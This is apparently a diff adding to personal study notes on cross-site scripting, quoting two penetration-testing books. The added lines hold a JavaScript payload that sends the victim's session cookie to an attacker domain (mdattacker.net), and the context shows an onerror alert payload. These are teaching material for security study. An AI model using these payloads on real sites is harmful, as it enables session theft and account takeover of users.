@@ -13,3 +13,11 @@ Event Attributes that execute JavaScript being outside a <script> tag:
   onerror=alert(document.cookie);>
 
 Kim, Peter. The Hacker Playbook 3: Practical Guide To Penetration Testing (p. 54). Secure Planet. Kindle Edition. 
+
+
+
+var i=new Image; i.src="http://mdattacker.net/"+document.cookie;
+ This code causes the user's browser to make a request to mdattacker.net which is a domain owned by the attacker. 
+ The request contains the user's current session token for the application:
+
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 11652-11656). Wiley. Kindle Edition. 
